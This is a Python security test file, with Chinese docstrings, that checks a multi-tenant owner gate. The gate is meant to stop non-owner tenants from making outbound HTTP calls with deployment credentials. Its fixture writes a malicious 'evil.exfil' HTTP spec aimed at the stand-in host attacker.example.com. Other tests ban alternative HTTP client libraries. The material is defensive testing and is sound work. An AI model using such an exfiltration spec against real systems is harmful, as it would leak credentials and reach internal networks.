"""闸门：file catalog owner-gate 的三层门（v0.9.6 D1/D7/D8）—— **非 owner 路径唯一的覆盖**。

## 为什么这个文件承重
既有套件里触及 `pick_http_route` / `execute` / `run_http_step` 的 **8 个测文件全部在 tid=1（owner）下跑**
（显式 `{1,}` 或经 `conftest` autouse `{"id": 1, …}`，实读）⇒ **owner 路径覆盖充分，非 owner 路径零覆盖**。
本文件补的就是那一半。

## 三层，一个谓词（别把它们合并）
| 层 | 落点 | 行为 | 被谁绕过 |
|---|---|---|---|
**硬边界** | `adapters/http/executor.execute` **内** | 非 owner → `HTTPAuthError` | **绕不过** —— 它是唯一发请求 + 唯一读进程 env 凭据的函数 |
**软降级** | `http_planner.pick_http_route` Layer 0 | 返 `None` + 日志 → 优雅落 SQL | `run_http_step` 是**公开函数、自带 spec、不重新求 route** ⇒ 直呼即绕过 |
**文件闸** | `catalog_loaders.load_file_layer` | 非 owner 返完整 empty 五元组 | 只管 file 层；**DB producer 由租户 admin 自助写** |

⭐ 这个分工是评审三轮才收敛的（门装错位置错了两次）：
v1 论证在「谁 import `execute`」= **拓扑** · v2 门在 `pick_http_route` = **决策点** ·
v3 才落到 `execute` = **能力行使处**。**门要装在能力被行使的那一行。**

## ⛔ 本门是**代偿控制**，不是修复
它代偿 R-T-GATE 清单的 **②（per-tenant `http_spec` 凭据）和 ③（egress 租户域化）**：
- ② 只讲「无 `source_id` 的 env 路径」—— `source_id` 路径的凭据来自**租户自己的库**
  （`resolve_spec` → `get_datasource` → `get_conn`）⇒ 那条本已 per-tenant，本门对它是**过阻**；
- ③ **让这个过阻仍然正确**：allowlist 是**进程级** ⇒ 非 owner 即便用自己的凭据，
  打的也是**部署方 allowlist 里的主机** = 伸手进部署方网络（SSRF 向）。
⛔ **只有 ②③ 都落地才可移除本门**。
"""
from __future__ import annotations

import ast
import asyncio
import json
import pathlib

import pytest

from knot.core.tenant_context import (
    OWNER_TENANT_ID,
    current_tenant,
    is_owner_tenant,
    reset_active_tenant,
    set_active_tenant,
)
from knot.services.agents import catalog, catalog_loaders, catalog_state

_REPO = pathlib.Path(__file__).resolve().parents[1]

#: 恶意 http 表 + lexicon —— 租户 admin 经 `PUT /api/admin/catalog` 能写的全部东西
#: （`api/catalog.py:69-76` 对 `tables` **只校验 `isinstance(v, list)`**，`source_type`/`http_spec` 零校验）
_EVIL_TABLES = [{
    "db": "evil", "table": "exfil", "columns": [],
    "source_type": "http",
    "http_spec": {"method": "GET", "url_template": "{base_url}/v1/all",
                  "base_url": "https://attacker.example.com",
                  "auth_header": "k", "auth_value": "v"},
}]
_EVIL_LEXICON = {"持仓": ["evil.exfil"]}


@pytest.fixture
def two_tenants(tmp_path, monkeypatch):
    """tmp 数据根 + 两租户库（tid 1 = owner / tid 2 = 非 owner），各自建表。"""
    from knot.repositories import base, tenant_repo
    anchor = tmp_path / "knot.db"
    monkeypatch.setattr(base, "SQLITE_DB_PATH", str(anchor))
    monkeypatch.setattr(tenant_repo, "SQLITE_DB_PATH", str(anchor))
    tenant_repo.init_platform_db()
    tenant_repo.seed_default_tenant(db_dir="tenants/1")
    conn = tenant_repo.get_platform_conn()
    conn.execute("INSERT INTO tenants (id,slug,name,status,db_dir) "
                 "VALUES (2,'t2','T2','active','tenants/2')")
    conn.commit()
    conn.close()
    for tid, dbdir in ((1, "tenants/1"), (2, "tenants/2")):
        tok = set_active_tenant({"id": tid, "db_dir": dbdir})
        try:
            base.init_db()
        finally:
            reset_active_tenant(tok)
    catalog_state.invalidate_all()
    return {1: "tenants/1", 2: "tenants/2"}


def _in(tid: int, dbdir: str):
    return set_active_tenant({"id": tid, "db_dir": dbdir})


@pytest.fixture
def no_network(monkeypatch):
    """出网探针：**先记录、再抛** —— 返回记录列表。

    ⚠️ **为什么必须「先记录」而不是只抛**：`run_http_step` 有 `except Exception as e:` 兜底
    ⇒ 探针抛的异常**会被吞掉**、变成一个普通的 `success=False` ⇒ 「有没有真发请求」这个事件
    **在「返回了错误」这个 oracle 里表示不出来**。记录下来才可观察。
    （实施期实证：初版只抛不记 ⇒ 摘掉硬边界后测**仍绿**。）
    """
    import requests
    calls: list = []

    def _probe(url=None, *a, **k):
        calls.append(url)
        raise AssertionError("❌ 发生了真实网络请求 —— 硬边界失效")

    monkeypatch.setattr(requests, "get", _probe)
    monkeypatch.setattr(requests, "post", _probe)
    return calls


# ─── 谓词本身（验收 4/5/6）──────────────────────────────────────────────


def test_no_tenant_ctx_is_fail_closed():
    """验收 4：无 tenant ctx 调谓词 → **raise**（fail-closed 且响亮），不得静默返 False。

    静默返 False 会让「无 ctx」被当成「非 owner」⇒ 启动/脚本路径悄悄丢掉 file 层。
    取材=injection：把 `is_owner_tenant` 改成 `try/except: return False` → 本测红。
    """
    from knot.core.tenant_context import TenantContextError, clear_active_tenant
    tok = clear_active_tenant()
    try:
        with pytest.raises(TenantContextError):
            is_owner_tenant()
    finally:
        reset_active_tenant(tok)


@pytest.mark.parametrize("tid,expect", [
    (1, True),
    (2, False),
    (True, False),      # ⭐ bool 是 int 子类且 `True == 1`
    (1.0, False),       # ⭐ `1.0 == 1`
    ("1", False),
    (None, False),
])
def test_owner_predicate_is_strict_int(tid, expect):
    """⭐ 验收 5：`type(tid) is int and tid == OWNER_TENANT_ID` —— 严格 int。

    接 v0.9.4 的 tid 严格化教训：宽松比较会把 `True` / `1.0` 当成 owner
    ⇒ 一个来自 JSON 的 `1.0` 或一个 `True` 就能拿到部署方的 file 层。
    取材=injection：改成 `tid == OWNER_TENANT_ID`（去掉类型判定）→ `True` / `1.0` 两格红。
    """
    tok = set_active_tenant({"id": tid, "db_dir": "."})
    try:
        assert is_owner_tenant() is expect
    finally:
        reset_active_tenant(tok)


def test_owner_tenant_id_is_pinned_behaviorally(tmp_path, monkeypatch):
    """⭐ 验收 6：**行为式**钉住 —— seed 空平台库后读回的租户 id **== 常量**。

    ⚠️ **刻意不写 `assert OWNER_TENANT_ID == 1`** —— 那只是复述常量（tautology）。
    这里断言的是「**`seed_default_tenant` 造出来的那个租户，就是常量指的那个**」
    ⇒ 若将来 seed 改成别的 id 而常量没跟着改，本测红。
    """
    from knot.repositories import tenant_repo
    monkeypatch.setattr(tenant_repo, "SQLITE_DB_PATH", str(tmp_path / "knot.db"))
    tenant_repo.init_platform_db()
    tenant_repo.seed_default_tenant(db_dir="tenants/1")
    rows = tenant_repo.list_tenants()
    assert len(rows) == 1, f"seed 应恰造 1 个租户；实际 {rows}"
    assert rows[0]["id"] == OWNER_TENANT_ID, (
        f"seed 造出的租户 id={rows[0]['id']}，而 `OWNER_TENANT_ID`={OWNER_TENANT_ID} —— "
        "两者必须一致：常量的语义是「多租户之前就存在的那个租户」"
    )


# ─── 文件闸（验收 2/3）─────────────────────────────────────────────────


def test_non_owner_file_layer_is_fully_empty(two_tenants):
    """⭐ 验收 2：非 owner 的 file 五元组恰 `({}, [], "", [], "empty")` —— **禁半空**。

    「禁半空」的理由是具体的（实读 `catalog.reload()` 的五种合并策略）：
    `business_rules = db_rules if db_rules.strip() else f_rules` ⇒ 只清 tables 而留 `f_rules`，
    **空-DB 的非 owner 仍会拿到部署方业务口径**；`lexicon` 更是**无条件合并**。
    取材=revert：让 `load_file_layer` 直接 `return _load_from_files()` → 本测红。
    """
    tok = _in(2, "tenants/2")
    try:
        assert catalog_loaders.load_file_layer() == ({}, [], "", [], "empty")
    finally:
        reset_active_tenant(tok)


def test_owner_file_layer_is_unchanged(two_tenants):
    """**正对照**：owner 侧仍拿到真 file 层（与 `_load_from_files()` 逐字相同）。

    没有这一条，上一条测可以靠「让所有人都空」来通过 —— 那是把功能删掉而不是加门。
    """
    tok = _in(1, "tenants/1")
    try:
        assert catalog_loaders.load_file_layer() == catalog_loaders._load_from_files()
    finally:
        reset_active_tenant(tok)


def test_non_owner_reload_strict_does_not_raise(two_tenants):
    """验收 3：非 owner 下 `reload(strict=True)` **不抛**、`source='empty'`。

    承重：`strict=True` 是 admin reload 与 `pick_http_route` 触发路径用的 ——
    若它抛，非 owner 租户的 admin 面/查询面会 5xx 而不是优雅降级。
    """
    tok = _in(2, "tenants/2")
    try:
        catalog_state.invalidate_all()
        catalog.reload(strict=True)
        st = catalog_state.get_state()
        assert (st["tables"], st["lexicon"], st["business_rules"], st["source"]) == ([], {}, "", "empty")
    finally:
        reset_active_tenant(tok)


# ─── 软降级 + 硬边界（验收 7 / 7b / 8）──────────────────────────────────


def _write_evil(tid: int, dbdir: str):
    from knot.repositories import catalog_repo
    tok = _in(tid, dbdir)
    try:
        catalog_repo.update_catalog(
            1, tables=json.dumps(_EVIL_TABLES, ensure_ascii=False),
            lexicon=json.dumps(_EVIL_LEXICON, ensure_ascii=False))
    finally:
        reset_active_tenant(tok)
    catalog_state.invalidate_all()


def test_malicious_db_http_table_is_not_routed_for_non_owner(two_tenants, no_network):
    """⭐⭐ 验收 7（**符号已反向**）：非 owner 写入恶意 DB http spec + lexicon 后 `pick_http_route` **仍 None**。

    ⚠️ **本测的符号是评审纠正过的**：草案原写「**应命中**」——那是**把绕过固化成绿色回归不变量**。
    绕过链（Codex R1，四环逐字坐实）：`PUT` 对 `tables` 只校验 `isinstance(v, list)` →
    `catalog_loaders` 对**显式** `source_type` 一律保留 → DB 表入槽 → `pick_http_route` 命中。
    **攻击者连 lexicon 都是同一个 PUT 写的 ⇒ 零猜测、全自助。**
    取材=revert：摘掉 `pick_http_route` 的 Layer 0 → 本测红（命中 `evil.exfil`）。
    """
    from knot.services import http_planner
    _write_evil(2, "tenants/2")
    tok = _in(2, "tenants/2")
    try:
        catalog.reload(strict=False)
        assert catalog.is_http_table("evil.exfil"), "前提：恶意表确实进了槽（否则本测在验一个不存在的问题）"
        assert http_planner.pick_http_route("看下持仓", intent="detail") is None, (
            "非 owner 的恶意 DB http 表被路由命中 —— 软降级失效")
    finally:
        reset_active_tenant(tok)


def test_hard_boundary_blocks_direct_run_http_step(two_tenants, no_network):
    """⭐⭐⭐ 验收 7b：**绕过 `pick_http_route`、直呼 `run_http_step`** → `execute` 内被拒 + **零网络请求**。

    这是本文件判别力最高的一条：它复现的正是**软降级挡不住的那条路**——
    `run_http_step(refined_question, table_full_name, http_spec)` 是**公开函数、自带 spec、
    内部不重新求 route**（零 `pick_http_route` / `is_http_table`）；`api/query.py` 里
    `pick_http_route`（`:292`）与 `run_http_step`（`:332`）是**两次独立调用**、中间只隔一个 `if`。
    ⇒ monitor / 定时报表 / LogicForm 混合路由 / re-run 任一条接进来，只要拿到一个 spec 就能绕过软降级。
    ⭐ **实施期这条在软降级尚缺席时就通过了** —— 那正是「硬边界不依赖 `query.py` 那个 `if`」的证明。
    取材=revert：摘掉 `execute` 内的门 → `no_network` 探针炸（真发请求）→ 本测红。
    """
    from knot.services import http_planner
    tok = _in(2, "tenants/2")
    try:
        r = asyncio.run(http_planner.run_http_step("q", "evil.exfil", _EVIL_TABLES[0]["http_spec"]))
    finally:
        reset_active_tenant(tok)
    assert r["success"] is False
    # ⭐ 断言门的**专属消息**，不是 `error_kind` —— 实施期实证：后续的 allowlist 关卡**也抛
    # `HTTPAuthError`** ⇒ `error_kind == "http_auth"` 这个 oracle **分不清「门拦的」与「allowlist 拦的」**
    # ⇒ 摘掉硬边界后测仍绿。（同一把尺子：oracle 要能表示你要排除的那个事件。）
    assert "未启用 HTTP 数据源" in r["error"], (
        f"不是**门**拦下的（可能是后续关卡）：{r['error']!r} —— 硬边界可能已失效")
    # ⭐ 且**零网络请求**（探针先记录再抛 ⇒ 即便异常被吞，这个事件仍可观察）
    assert no_network == [], f"硬边界失效：真发出了请求 {no_network}"


def test_owner_passes_the_hard_boundary(two_tenants, no_network):
    """**正对照**：owner 过门后走到**后续**关卡（allowlist），而不是被门拦住。

    没有这一条，硬边界可以靠「拦住所有人」通过 —— 那是把功能删掉。
    ⚠️ 断言用「**不是门的消息**」而非具体后续错误 —— 后续关卡的措辞不属本片契约。
    """
    from knot.services import http_planner
    tok = _in(1, "tenants/1")
    try:
        r = asyncio.run(http_planner.run_http_step("q", "evil.exfil", _EVIL_TABLES[0]["http_spec"]))
        assert r["success"] is False           # allowlist 未配 → 仍失败，但**不是门拦的**
        assert "未启用 HTTP 数据源" not in r["error"], (
            f"owner 被门拦住了（过阻）：{r['error']!r}")
    finally:
        reset_active_tenant(tok)


def test_soft_degradation_logs(two_tenants, monkeypatch):
    """验收 8：软降级**必须记日志** —— 否则非 owner 的 http 表被拒 = **静默落 SQL**（v0.7.29b 形状）。

    取材=injection：删掉那行 `logger.info` → 本测红。
    """
    from knot.services import http_planner
    seen = []
    monkeypatch.setattr(http_planner.logger, "info", lambda m, *a, **k: seen.append(str(m)))
    _write_evil(2, "tenants/2")
    tok = _in(2, "tenants/2")
    try:
        http_planner.pick_http_route("看下持仓", intent="detail")
    finally:
        reset_active_tenant(tok)
    hit = [m for m in seen if "非起源租户" in m]
    assert hit, f"软降级未记日志（会静默落 SQL）；实际日志：{seen}"
    assert "tenant=2" in hit[0], f"日志须点名是哪个租户被拒：{hit[0]!r}"


def test_gate_message_leaks_nothing(two_tenants, no_network):
    """⭐ 验收 8d：门的消息**不含** env 名 / owner tid / 部署方表名 —— #262 那条缝。

    `run_http_step` 把 `str(e)` 放进 `result["error"]`，`api/query.py` **原样 yield 给客户端**
    （#262 的教训原文就在 `executor.py` 的注释里）；且前端对 `error_kind` 是通用渲染
    ⇒ **门写的消息就是用户看到的**。
    取材=revert：把门消息改成含 env 名/tid 的版本 → 本测红。
    """
    from knot.services import http_planner
    tok = _in(2, "tenants/2")
    try:
        msg = asyncio.run(http_planner.run_http_step("q", "evil.exfil", _EVIL_TABLES[0]["http_spec"]))["error"]
    finally:
        reset_active_tenant(tok)
    for bad in ("KNOT_", "JWT_SECRET", "MASTER_KEY", "_local_catalog", "OWNER_TENANT_ID"):
        assert bad not in msg, f"门消息泄漏 {bad!r}：{msg!r}"
    assert not any(ch.isdigit() for ch in msg), f"门消息含数字（可能是 tid）：{msg!r}"


# ─── 结构哨兵（验收 7c / 8b / 8e）───────────────────────────────────────


def test_three_consumers_share_one_predicate():
    """⭐ 验收 7c：三个消费点**共用同一谓词**（一个谓词、多个执行点 ≠「N 份清单」）。

    多份**判断**才是 N 份清单病；多个**执行点**共用一个判断是正确形状。
    取材=injection：在任一消费点改成本地重写判定（如 `current_tenant()["id"] == 1`）→ 本测红。
    """
    consumers = {
        "knot/services/agents/catalog_loaders.py": "load_file_layer",
        "knot/services/http_planner.py": "pick_http_route",
        "knot/adapters/http/executor.py": "execute",
    }
    for rel, fn_name in consumers.items():
        tree = ast.parse((_REPO / rel).read_text(encoding="utf-8"))
        fn = next((n for n in ast.walk(tree)
                   if isinstance(n, ast.FunctionDef | ast.AsyncFunctionDef) and n.name == fn_name), None)
        assert fn is not None, f"{rel} 里找不到 {fn_name}"
        names = {a.name for n in ast.walk(fn) if isinstance(n, ast.ImportFrom) for a in n.names}
        names |= {n.id for n in ast.walk(fn) if isinstance(n, ast.Name)}
        assert "is_owner_tenant" in names, (
            f"{rel}::{fn_name} 未使用共用谓词 `is_owner_tenant` —— 三处判据会漂移")


def test_all_outbound_requests_calls_live_inside_execute():
    """⭐ 验收 8b：`adapters/http/**` 内**所有** `requests.*` 出网调用都在 `execute` 内。

    门在**能力**里 ⇒ 哨兵的职责变成守「**这个能力没有兄弟**」：若有人在 `execute` 外再加一个
    `requests.get`，门就被绕过（那才是新的能力点）。
    取材=injection：在 `executor.py` 的 `execute` **外**加一个 `requests.get(...)` → 本测红。
    """
    offenders = []
    for py in sorted((_REPO / "knot" / "adapters" / "http").rglob("*.py")):
        tree = ast.parse(py.read_text(encoding="utf-8"))
        inside = set()
        for fn in ast.walk(tree):
            if isinstance(fn, ast.FunctionDef | ast.AsyncFunctionDef) and fn.name == "execute":
                inside = {id(n) for n in ast.walk(fn)}
        for n in ast.walk(tree):
            if (isinstance(n, ast.Call) and isinstance(n.func, ast.Attribute)
                    and isinstance(n.func.value, ast.Name) and n.func.value.id == "requests"
                    and n.func.attr in ("get", "post", "put", "delete", "patch", "request", "head")):
                if id(n) not in inside:
                    offenders.append(f"{py.relative_to(_REPO)}:{n.lineno} requests.{n.func.attr}")
    assert not offenders, (
        "`adapters/http/**` 出现 `execute` **之外**的出网调用：\n  " + "\n  ".join(offenders)
        + "\n\n门装在 `execute` 内（能力行使处）⇒ 新的出网点就是新的能力点、绕过门。"
    )


def test_no_second_http_client_in_http_adapter():
    """⭐ 验收 8e：`adapters/http/**` **不得引入第二个 HTTP 客户端**。

    只看 `requests.*` 的 oracle **表示不了「换个库」这个事件** —— 有人改用 `httpx` 就绕过了上一条。
    ⚠️ **放行 `urllib.parse`**：`url_allowlist.py` 用它做 URL **解析**，**解析器不是客户端**
    （不放行会误报 —— 实读确认过）。
    取材=injection：加 `import httpx` → 本测红；`urllib.parse` 不得误报。
    """
    banned = {"httpx", "aiohttp", "http.client", "socket", "urllib.request", "urllib3", "pycurl"}
    offenders = []
    for py in sorted((_REPO / "knot" / "adapters" / "http").rglob("*.py")):
        tree = ast.parse(py.read_text(encoding="utf-8"))
        for n in ast.walk(tree):
            mods = []
            if isinstance(n, ast.Import):
                mods = [a.name for a in n.names]
            elif isinstance(n, ast.ImportFrom) and n.module:
                mods = [n.module]
            for m in mods:
                root = m.split(".")[0]
                if m in banned or (root in banned and root != "urllib"):
                    offenders.append(f"{py.relative_to(_REPO)}:{n.lineno} {m}")
    assert not offenders, (
        "`adapters/http/**` 引入了第二个 HTTP 客户端：\n  " + "\n  ".join(offenders)
        + "\n\n门与出网哨兵都建立在「唯一客户端 = `requests`，唯一出网点 = `execute`」之上。"
    )


# ─── 耦合 tripwire（验收 8c · 行为级）──────────────────────────────────


def test_coupling_gate_exists_implies_rtgate_not_lifted(two_tenants):
    """⭐⭐ 验收 8c：**门存在 ⇒ R-T-GATE 未 lift**（**行为级**断言，不是存在性）。

    ⚠️ **为什么必须行为级**：断言「`assert_no_second_active_tenant_served` 那一行还在」只能抓**删除**，
    抓不住这四种「**事实上 lift 了而行还在**」：`if False:` 包起来 · 本体改 no-op ·
    **把调用点移到 tid 解析之后**（不再是第一行 ⇒ 对平台/无 token 路径失效）· 前面插 early return。
    ⇒ 这里断言的是**后果**：两个 active 租户时请求**仍 fail-closed**。
    **你要排除的事件是「R-T-GATE 事实上不再生效」，不是「那一行不见了」。**

    为什么这条测挂在本片：本门是**代偿控制**；若有人 lift 了 R-T-GATE 而 ②③ 未落地，
    非 owner 就会被真实服务，而门只是把它们的 HTTP 关掉 —— **凭据与 egress 仍是部署方那套**。
    ⇒ lift 必须撞一条**点名本门**的红测。
    取材=injection：注释掉 `resolve_for_request` 里那行 gate（或上述四种中和手法任一）→ 本测红。
    """
    from knot.api import tenant_resolution as tr
    from knot.core.tenant_context import TenantContextError

    class _Req:
        headers: dict = {}
        url = type("U", (), {"path": "/api/conversations"})()

    # ⚠️⚠️ **必须 `try/except/else`，不能用 `pytest.raises(..., match=...)`**（守护者 Stage 4 §II）：
    # `match=` 本身已保证「异常消息含 R-T-GATE」⇒ 紧随其后的 `assert ... , "<说明>"` **永不失败**
    # ⇒ 那段精心写的说明**永远不会被显示**；而**真实的**失败模式（有人 lift ⇒ 不抛）只会得到
    # pytest 的 `DID NOT RAISE TenantContextError`，**不点名任何门** ⇒ 「lift 就撞一条点名这个门的红测」
    # 这个设计意图在最后一寸失效。
    # ⭐ **这是同一个错的第四次**：门放「决定处」而非「能力处」（三次）→ 说明放「**成功路径**」
    # 而非「**失败路径**」（本次）。**统一判据：门装在能力被行使的那一行；消息挂在事情真的出错的那一行。**
    try:
        tr.resolve_for_request(_Req())
    except TenantContextError as e:
        assert "R-T-GATE" in str(e), f"fail-closed 了但不是 R-T-GATE 挡的：{e}"
    else:
        pytest.fail(
            "两个 active 租户时请求**未** fail-closed —— **R-T-GATE 事实上已不生效**。\n"
            "⚠️ 而 v0.9.6 的 owner 门（`adapters/http/executor.execute` 内）是**代偿控制**：\n"
            "   它只关掉非 owner 的 **HTTP 出网**，而 **② per-tenant `http_spec` 凭据** 与\n"
            "   **③ egress 租户域化** 仍是**部署方那一套** ⇒ **lift 前必须先落地 ②③**。\n"
            "⇒ 若你正在 lift R-T-GATE：先读 CLAUDE.md 的 R-T-GATE 就绪清单 B-3 分项，\n"
            "   以及 `executor.execute` 里那段「只有 ②③ 都落地才可移除本门」的注释。"
        )


# ─── 已知现状登记（验收 12 · xfail 非 strict）──────────────────────────


@pytest.mark.xfail(strict=False, reason="v0.9.6 已知现状：写入先提交、strict 校验后跑 —— 修它要动 admin 端点 + 想清既有数据，登记 backlog")
def test_catalog_put_should_not_persist_when_strict_validation_fails(two_tenants):
    """⚠️ **期望**行为：`PUT /api/admin/catalog` 的 strict 校验失败时**不应**留下已持久化的污染。

    实读现状（`api/catalog.py:119-122`）：`catalog_repo.update_catalog(1, **updates)` **先提交**、
    `catalog_loader.reload(strict=True)` **后跑** ⇒ 即使 strict 抛（调用方看到 5xx），
    **污染已持久化**，而查询路径用 `reload()`（strict=False）会把它**激活**。

    ⚠️ **本测刻意断言「期望行为」并标 `xfail(strict=False)`**，**不是**写成「通过测断言污染确实持久化」——
    后者会**惩罚将来修它的人**（修好即转红、只能删），与本片 R-v096-7 禁的形状同型
    （评审期我在同一张验收表相邻两行犯过同一个符号错）。
    `strict=False` ⇒ 修好时自然 XPASS 而不拦路。
    """
    from knot.repositories import catalog_repo
    tok = _in(2, "tenants/2")
    try:
        catalog_repo.update_catalog(1, tables=json.dumps(_EVIL_TABLES, ensure_ascii=False))
        # 期望：strict 校验失败 ⇒ 不留污染。现状：留了 ⇒ 本断言失败 ⇒ xfail。
        catalog_state.invalidate_all()
        catalog.reload(strict=False)
        assert not catalog.is_http_table("evil.exfil"), "strict 校验失败后污染仍被持久化并激活"
    finally:
        reset_active_tenant(tok)


# ─── 端点级（验收 9/10/11 · Stage 1' 必改清单第 5 项）─────────────────────


@pytest.fixture
def non_owner_client(tmp_path, monkeypatch):
    """**非 owner 租户是唯一 active** 的 TestClient + 其 admin 的 Bearer header。

    ⚠️ **为什么要「唯一 active」而不是「两个 active」**：R-T-GATE 的
    `assert_no_second_active_tenant_served()` 是 `resolve_for_request` 的**第一行**
    ⇒ 两个 active 时**整站 fail-closed**、端点根本走不到 ⇒ 端点级验收无法进行。
    ⇒ 造「tenant#1 suspended + tenant#2 active」这个**lift 后的近似形态**（唯一可服务者是非 owner）。
    """
    # ⚠️ 必须用 `NoAmbientTenantTestClient`（v0.9.4 R17 哨兵强制，实施期它抓了我一次）：
    # 裸 `TestClient` 会让 conftest autouse 的**环境 tenant ctx（tid=1 = owner）渗进请求**
    # ⇒ 本测可能**因为错误的原因而绿**（看的是 owner 的槽，不是中间件解析出的 tid=2）。
    # 那个哨兵守的正是「v0.9.4 发现的测试盲区」—— 它在这里保护的是**我这条测的判别力**。
    from knot.repositories import base, tenant_repo, user_repo
    from tests.conftest import NoAmbientTenantTestClient
    anchor = tmp_path / "knot.db"
    monkeypatch.setattr(base, "SQLITE_DB_PATH", str(anchor))
    monkeypatch.setattr(tenant_repo, "SQLITE_DB_PATH", str(anchor))
    tenant_repo.init_platform_db()
    conn = tenant_repo.get_platform_conn()
    conn.executescript(
        "INSERT INTO tenants (id,slug,name,status,db_dir) VALUES (1,'default','起源','suspended','tenants/1');"
        "INSERT INTO tenants (id,slug,name,status,db_dir) VALUES (2,'t2','T2','active','.');"
    )
    conn.commit()
    conn.close()
    tok = _in(2, ".")
    try:
        base.init_db()
        admin = user_repo.get_user_by_username("admin")
        if admin and admin.get("must_change_password"):
            user_repo.update_user(admin["id"], must_change_password=0)
        # ⚠️ 必须有**至少一个** datasource：`_infer_source_types_from_datasources` 对**空表**
        # ε2 fail-fast（`MetadataError: DataSource 表为空`）⇒ `PUT`/`reset` 走 `reload(strict=True)` 会 500，
        # 与本片的门无关。真实租户必有数据源 ⇒ 补一个 doris（**非 http**，故不影响 source_type 推断：
        # 无 http 型 datasource 时该函数原样返回 tables，而我们的恶意表本就带**显式** source_type）。
        from knot.repositories import data_source_repo
        data_source_repo.create_datasource(
            admin["id"], "t2-doris", "", "127.0.0.1", 9030, "u", "p", "db", db_type="doris")
    finally:
        reset_active_tenant(tok)
    catalog_state.invalidate_all()

    from knot.main import app
    with NoAmbientTenantTestClient(app) as c:
        r = c.post("/api/auth/login", json={"username": "admin", "password": "admin123"})
        assert r.status_code == 200, f"非 owner 租户 admin 登录失败：{r.text}"
        yield c, {"Authorization": f"Bearer {r.json()['token']}"}


def test_endpoint_non_owner_catalog_has_no_file_layer(non_owner_client):
    """⭐ 验收 9：非 owner 租户 admin 的 `GET /api/admin/catalog` —— **file 层内容全缺席**。

    这一层承重：v0.9.5 抓到的 `defaults` 泄漏就住在**端点层** ——
    槽层守护绿而端点仍吐部署方内容是可能的（那次就是）。
    断言用「**file 层实际内容的缺席**」而非计数：从 `_load_from_files()` 现算出部署方的表名/关键词，
    断言它们**一个都不在**响应里（环境相关的量不写成数字 —— v0.9.3 §III-1 教训）。
    """
    client, headers = non_owner_client
    f_lex, f_tables, f_rules, _f_rel, _src = catalog_loaders._load_from_files()
    r = client.get("/api/admin/catalog", headers=headers)
    assert r.status_code == 200, r.text
    body = r.json()
    got_tables = {f"{t.get('db')}.{t.get('table')}" for t in body["current"]["tables"]}
    leaked = sorted({f"{t.get('db')}.{t.get('table')}" for t in (f_tables or [])} & got_tables)
    assert not leaked, f"部署方 file 层的表泄漏给非 owner 租户：{leaked}"
    leaked_kw = sorted(set(f_lex or {}) & set(body["current"]["lexicon"] or {}))
    assert not leaked_kw, f"部署方 file 层的 lexicon 关键词泄漏：{leaked_kw}"
    if (f_rules or "").strip():
        assert (f_rules or "").strip() not in (body["current"]["business_rules"] or ""), (
            "部署方**业务口径**泄漏给非 owner 租户 —— 这正是「禁半空」要防的那一项")


def test_endpoint_non_owner_reset_does_not_restore_deployment_defaults(non_owner_client):
    """⭐ 验收 10：非 owner 租户 `POST /api/admin/catalog/reset` **不恢复**部署方默认。

    `/reset` 的语义是「清 DB 覆盖、回退到默认」—— 而「默认」对非 owner 必须是**空**，不是部署方的 file 层。
    取材=revert：摘掉 `load_file_layer` 的判据 → reset 后部署方表回来 → 本测红。
    """
    client, headers = non_owner_client
    f_lex, f_tables, _r, _rel, _s = catalog_loaders._load_from_files()
    r = client.post("/api/admin/catalog/reset", json={}, headers=headers)
    assert r.status_code == 200, r.text
    body = client.get("/api/admin/catalog", headers=headers).json()
    got = {f"{t.get('db')}.{t.get('table')}" for t in body["current"]["tables"]}
    assert not ({f"{t.get('db')}.{t.get('table')}" for t in (f_tables or [])} & got), (
        f"reset 把部署方 file 层「恢复」给了非 owner 租户：{sorted(got)}")
    assert not (set(f_lex or {}) & set(body["current"]["lexicon"] or {}))


def test_endpoint_non_owner_malicious_put_writes_but_execution_is_refused(non_owner_client, no_network):
    """⭐ 验收 11：非 owner 恶意 `PUT`（含 `source_type=http`）**写入成功**，但**执行被硬边界拒**。

    ⚠️ **本测刻意承认现状**：`PUT` 对 `tables` **只校验 `isinstance(v, list)`**
    （`source_type` / `http_spec` 零校验）⇒ 写入**会**成功。本片**不改那个校验**（登记 backlog：
    动它要连带想清「既有已写入数据怎么办」）。
    ⇒ 本片的答案是**在执行处拦**：写进去也用不了。这条测把那个分工钉住 ——
    若将来有人加了 PUT 侧校验，前半断言会红并提醒他同步本测（那是好事，不是坏事）。
    """
    from knot.services import http_planner
    client, headers = non_owner_client
    r = client.put("/api/admin/catalog",
                   json={"tables": _EVIL_TABLES, "lexicon": _EVIL_LEXICON}, headers=headers)
    assert r.status_code == 200, f"现状是 PUT 零校验 ⇒ 应写入成功；若这里变了请同步本测：{r.text}"
    body = client.get("/api/admin/catalog", headers=headers).json()
    assert any(t.get("table") == "exfil" for t in body["current"]["tables"]), "前提：恶意表确实写进去了"

    tok = _in(2, ".")
    try:
        assert http_planner.pick_http_route("看下持仓", intent="detail") is None, "软降级失效"
        res = asyncio.run(http_planner.run_http_step("q", "evil.exfil", _EVIL_TABLES[0]["http_spec"]))
    finally:
        reset_active_tenant(tok)
    assert "未启用 HTTP 数据源" in res["error"], f"硬边界失效：{res['error']!r}"
    assert no_network == [], f"硬边界失效：真发出了请求 {no_network}"
